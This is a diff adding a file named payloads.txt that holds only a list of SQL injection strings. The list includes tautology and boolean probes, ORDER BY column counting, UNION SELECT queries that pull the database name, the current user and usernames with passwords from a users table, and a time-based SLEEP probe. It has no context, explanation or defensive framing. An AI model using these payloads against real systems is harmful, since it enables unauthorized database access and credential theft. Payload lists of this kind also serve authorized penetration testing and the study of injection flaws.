@@ -1,0 +1,15 @@
+
+---
+
+# 📄 payloads.txt
+
+```text
+1' OR '1'='1
+1' AND 1=1--
+1' AND 1=2--
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' UNION SELECT 1,2--
+1' UNION SELECT database(),user()--
+1' UNION SELECT user,password FROM users--
+1' AND SLEEP(5)--
